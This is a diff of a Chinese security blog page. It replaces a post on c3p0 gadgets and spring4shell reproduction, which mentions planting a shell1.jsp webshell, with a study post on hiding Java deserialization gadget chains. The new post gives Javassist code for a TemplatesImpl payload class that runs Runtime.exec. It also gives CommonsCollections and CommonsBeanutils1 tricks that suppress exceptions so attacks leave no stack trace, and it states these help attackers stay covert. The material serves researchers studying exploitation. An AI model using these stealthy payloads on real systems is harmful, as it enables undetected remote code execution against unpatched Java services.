@@ -16,30 +16,32 @@
   <meta name="author" content="unam4">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简介​	主要是我和springkill研究成功的一部分。 2025补天沙龙城市参会议题。复现demo的地址https:&#x2F;&#x2F;github.com&#x2F;unam4&#x2F;c3p0explore   	      	     spring4shell 复现​		原理见ppt ​		这里以jndi 复现，也可以使用反序列化复现  启动jndi服务  成功打入第一个  然后一次打入pv1-pv5  打完后会在root">
+    <meta name="description" content="使Gadget Chain更加隐蔽原理在反序列化过程中，如果Gadget Chain的构造不当，可能会抛出异常，从而暴露攻击行为。为了使攻击更加隐蔽，需要深入理解Gadget Chain的代码流程，避免抛出异常。 方法 处理Translet异常： 在使用Translet相关的Gadget Chain时，可能会抛出NullPointerException，可以通过初始化namesArray字段或设置">
 <meta property="og:type" content="article">
-<meta property="og:title" content="c3p0探索——newgadget">
-<meta property="og:url" content="https://unam4.github.io/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/index.html">
+<meta property="og:title" content="[学习]隐藏反序列化Gadget">
+<meta property="og:url" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/index.html">
 <meta property="og:site_name" content="unam4">
-<meta property="og:description" content="简介​	主要是我和springkill研究成功的一部分。 2025补天沙龙城市参会议题。复现demo的地址https:&#x2F;&#x2F;github.com&#x2F;unam4&#x2F;c3p0explore   	      	     spring4shell 复现​		原理见ppt ​		这里以jndi 复现，也可以使用反序列化复现  启动jndi服务  成功打入第一个  然后一次打入pv1-pv5  打完后会在root">
+<meta property="og:description" content="使Gadget Chain更加隐蔽原理在反序列化过程中，如果Gadget Chain的构造不当，可能会抛出异常，从而暴露攻击行为。为了使攻击更加隐蔽，需要深入理解Gadget Chain的代码流程，避免抛出异常。 方法 处理Translet异常： 在使用Translet相关的Gadget Chain时，可能会抛出NullPointerException，可以通过初始化namesArray字段或设置">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://unam4.github.io/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/image-20250404014641040.png">
-<meta property="og:image" content="https://unam4.github.io/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/image-20250404014736049.png">
-<meta property="og:image" content="https://unam4.github.io/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/image-20250404014801419.png">
-<meta property="og:image" content="https://unam4.github.io/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/image-20250404015031586.png">
-<meta property="og:image" content="https://unam4.github.io/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/image-20250404015146029.png">
-<meta property="article:published_time" content="2025-04-03T17:39:46.000Z">
-<meta property="article:modified_time" content="2025-04-03T17:56:40.134Z">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410204046472.png">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410204251248.png">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410204907457.png">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410213730326.png">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410213854530.png">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410214006325.png">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410214129054.png">
+<meta property="og:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410214425620.png">
+<meta property="article:published_time" content="2025-04-10T12:25:23.000Z">
+<meta property="article:modified_time" content="2025-04-10T13:45:52.531Z">
 <meta property="article:author" content="unam4">
-<meta property="article:tag" content="议题">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://unam4.github.io/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/image-20250404014641040.png">
+<meta name="twitter:image" content="https://unam4.github.io/2025/04/10/%E5%AD%A6%E4%B9%A0-%E9%9A%90%E8%97%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget/image-20250410204046472.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>c3p0探索——newgadget - unam4</title>
+  <title>[学习]隐藏反序列化Gadget - unam4</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -217,7 +219,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="c3p0探索——newgadget"></span>
+            <span id="subtitle" data-typed-text="[学习]隐藏反序列化Gadget"></span>
           
         </div>
 
@@ -228,8 +230,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-04-04 01:39" pubdate>
-          2025年4月4日 凌晨
+        <time datetime="2025-04-10 20:25" pubdate>
+          2025年4月10日 晚上
         </time>
       </span>
     
@@ -240,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          87 字
+          611 字
         
       </span>
     
@@ -251,7 +253,7 @@
         
         
         
-          1 分钟
+          6 分钟
         
       </span>
     
@@ -296,33 +298,58 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">c3p0探索——newgadget</h1>
+            <h1 id="seo-header">[学习]隐藏反序列化Gadget</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​	主要是我和springkill研究成功的一部分。 2025补天沙龙城市参会议题。复现demo的地址<a target="_blank" rel="noopener" href="https://github.com/unam4/c3p0explore">https://github.com/unam4/c3p0explore</a></p>
+                <h3 id="使Gadget-Chain更加隐蔽"><a href="#使Gadget-Chain更加隐蔽" class="headerlink" title="使Gadget Chain更加隐蔽"></a>使Gadget Chain更加隐蔽</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在反序列化过程中，如果Gadget Chain的构造不当，可能会抛出异常，从而暴露攻击行为。为了使攻击更加隐蔽，需要深入理解Gadget Chain的代码流程，避免抛出异常。</p>
+<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul>
+<li><strong>处理Translet异常：</strong> 在使用Translet相关的Gadget Chain时，可能会抛出<code>NullPointerException</code>，可以通过初始化<code>namesArray</code>字段或设置<code>transletVersion</code>字段来避免。</li>
+<li><strong>处理CommonsCollections异常：</strong> 在使用CommonsCollections相关的Gadget Chain时，可能会因为Transformer Chain的返回值不是Comparable类型而抛出异常，可以通过在Chain的末尾添加<code>ConstantTransformer(&quot;&quot;)</code>来避免。</li>
+<li><strong>处理CommonsBeanutils1异常：</strong> 在使用CommonsBeanutils1 Gadget Chain时，可能会因为<code>getOutputProperties</code>方法返回的对象不是Comparable类型而抛出异常，可以通过使用<code>NullComparator</code>来避免。</li>
+<li><strong>将Gadget Chain封装在真实对象中：</strong> 如果应用程序期望接收特定类型的对象，可以将Gadget Chain封装在该类型的对象中，避免应用程序抛出类型转换异常。</li>
+</ul>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><strong>处理Translet异常：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">java<br><br> 代码解读<br>复制代码clazz.getConstructors()[<span class="hljs-number">0</span>].setBody(<span class="hljs-string">&quot;this.namesArray = new String[0];&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>处理CommonsCollections异常：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">java<br><br> 代码解读<br>复制代码<span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    transformer,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;&quot;</span>)<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><strong>处理CommonsBeanutils1异常：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java<br><br> 代码解读<br>复制代码Constructor&lt;?&gt; nullComparatorConstructor = Reflections.getFirstCtor(<span class="hljs-string">&quot;java.util.Comparators$NullComparator&quot;</span>);<br>Comparator&lt;?&gt; nullComparator = (Comparator&lt;?&gt;) nullComparatorConstructor.newInstance(<span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;lowestSetBit&quot;</span>, nullComparator);<br></code></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文介绍了一些高级的Java反序列化漏洞利用技巧，包括绕过WAF和EDR、运行时注入自定义类、利用ThreadLocal绕过数据过滤、劫持HTTP请求流程、使Gadget Chain更加隐蔽等。这些技巧可以帮助攻击者更加隐蔽地进行攻击，但也提醒我们，需要不断加强安全防护，及时修补漏洞，才能有效地保护系统安全。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="AbstractTranslet"><a href="#AbstractTranslet" class="headerlink" title="AbstractTranslet"></a>AbstractTranslet</h4><p>通常我们使用反序列化加载class,会使用到template. 最后的调用栈如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Caused by: java.lang.NullPointerException<br>	at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:<span class="hljs-number">372</span>)<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:<span class="hljs-number">456</span>)<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:<span class="hljs-number">486</span>)<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:<span class="hljs-number">64</span>)<br>	... <span class="hljs-number">21</span> more<br></code></pre></td></tr></table></figure>
+
+<p>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization</p>
+<p><img src="image-20250410204046472.png" srcset="/img/loading.gif" lazyload alt="image-20250410204046472"></p>
+<p>来到这个类，可以看到他会判断transletVersion &lt; VER_SPLIT_NAMES_ARRAY，然后获取namesArray.length</p>
+<p><img src="image-20250410204251248.png" srcset="/img/loading.gif" lazyload alt="image-20250410204251248"></p>
+<p>其中transletVersion &lt; VER_SPLIT_NAMES_ARRAY 是final修饰，有初始值。namesArray没有初始值, 所以在反序列化时为null，触发错误。也就是我们只要给namesArray赋值可以了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cat</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cat&quot;</span>);<br><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, cat);<br>constructor.setBody(<span class="hljs-string">&quot;&#123;java.lang.reflect.Field namesArray = this.getClass().getSuperclass().getDeclaredField(\&quot;namesArray\&quot;);namesArray.setAccessible(true); namesArray.set(this, new String[0]);&#125;&quot;</span>);<br>cat.addConstructor(constructor);<br>cat.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>cat.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>所以在构造构造函数时对父类namesArray赋值为0，就不会报错，从而达到隐藏gadget的目的。</p>
+<p><img src="image-20250410204907457.png" srcset="/img/loading.gif" lazyload alt="image-20250410204907457"></p>
+<p>运行后，无报错信息。</p>
+<h4 id="CommonsCollections"><a href="#CommonsCollections" class="headerlink" title="CommonsCollections"></a><strong>CommonsCollections</strong></h4><p><strong>ChainedTransformer</strong>链式调用最后面插入一个 <strong>new</strong> <strong>ConstantTransformer</strong>(“”);返回空。</p>
+<h4 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a><strong>CommonsBeanutils1</strong></h4><p><img src="image-20250410213730326.png" srcset="/img/loading.gif" lazyload alt="image-20250410213730326"></p>
+<p>正常情况下的调用，会包强转错误，爆出调用流</p>
+<p>org.apache.commons.beanutils.BeanComparator#compare</p>
+<p><img src="image-20250410213854530.png" srcset="/img/loading.gif" lazyload alt="image-20250410213854530"></p>
+<p>在getProperty触发getter方法对到对象，然后调用internalCompare方法</p>
+<p><img src="image-20250410214006325.png" srcset="/img/loading.gif" lazyload alt="image-20250410214006325"></p>
+<p>最后调用comparator.compare. 所以我们这个comparator改成Comparators$NullComparator</p>
+<p><img src="image-20250410214129054.png" srcset="/img/loading.gif" lazyload alt="image-20250410214129054"></p>
+<p>可以看到我们可以到吧这个类的real赋值为null，就可以断掉整个流程。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">   Constructor&lt;?&gt; constructors = utils.getConstructor(<span class="hljs-string">&quot;java.util.Comparators$NullComparator&quot;</span>);<br>   <span class="hljs-type">Comparator</span> <span class="hljs-variable">nullComparator</span> <span class="hljs-operator">=</span> (Comparator) constructors.newInstance(<span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>);<br><br>   BeanComparator&lt;Object&gt; objectBeanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;1&quot;</span>,nullComparator);<br>   setFieldValue(objectBeanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue1</span> <span class="hljs-operator">=</span> priorityqueue2compare(objectBeanComparator, templates);<br></code></pre></td></tr></table></figure>
 
 
-	<div class="row">
-    <embed src="c3p0新链探索—深入挖掘数据库连接池的安全隐患—unam4.pdf" width="100%" height="550" type="application/pdf">
-	</div>
 
-
-
-
-<h3 id="spring4shell-复现"><a href="#spring4shell-复现" class="headerlink" title="spring4shell 复现"></a>spring4shell 复现</h3><p>​		原理见ppt</p>
-<p>​		这里以jndi 复现，也可以使用反序列化复现</p>
-<p><img src="image-20250404014641040.png" srcset="/img/loading.gif" lazyload alt="image-20250404014641040"></p>
-<p>启动jndi服务</p>
-<p><img src="image-20250404014736049.png" srcset="/img/loading.gif" lazyload alt="image-20250404014736049"></p>
-<p>成功打入第一个</p>
-<p><img src="image-20250404014801419.png" srcset="/img/loading.gif" lazyload alt="image-20250404014801419"></p>
-<p>然后一次打入pv1-pv5</p>
-<p><img src="image-20250404015031586.png" srcset="/img/loading.gif" lazyload alt="image-20250404015031586"></p>
-<p>打完后会在root下生成shell1.jsp  文件名有prefix+fileDateFormat+.jsp 构成</p>
-<p><img src="image-20250404015146029.png" srcset="/img/loading.gif" lazyload alt="image-20250404015146029"></p>
-<p>最后成执行。</p>
+<p>​	<img src="image-20250410214425620.png" srcset="/img/loading.gif" lazyload alt="image-20250410214425620"></p>
+<p>可以看到反序列化的时候，走到了 null.compare. 从而达到隐藏调用流的目的</p>
+<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7468524354438135823#heading-16">https://juejin.cn/post/7468524354438135823#heading-16</a></p>
 
                 
               </div>
@@ -332,13 +359,6 @@
               <div class="post-metas my-3">
   
   
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E8%AE%AE%E9%A2%98/" class="print-no-link">#议题</a>
-      
-    </div>
-  
 </div>
 
 
@@ -347,8 +367,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>c3p0探索——newgadget</div>
-      <div>https://unam4.github.io/2025/04/04/c3p0探索——newgadget/</div>
+      <div>[学习]隐藏反序列化Gadget</div>
+      <div>https://unam4.github.io/2025/04/10/学习-隐藏反序列化Gadget/</div>
     </div>
     <div class="license-meta">
       
@@ -360,7 +380,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年4月4日</div>
+          <div>2025年4月10日</div>
         </div>
       
       
@@ -392,18 +412,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/04/apache-shenyu-2-5-1-spel/" title="apache-shenyu_2.5.1_spel">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">apache-shenyu_2.5.1_spel</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/" title="sqllitejdbc攻击">
-                        <span class="hidden-mobile">sqllitejdbc攻击</span>
+                      <a href="/2025/04/04/apache-shenyu-2-5-1-spel/" title="apache-shenyu_2.5.1_spel">
+                        <span class="hidden-mobile">apache-shenyu_2.5.1_spel</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
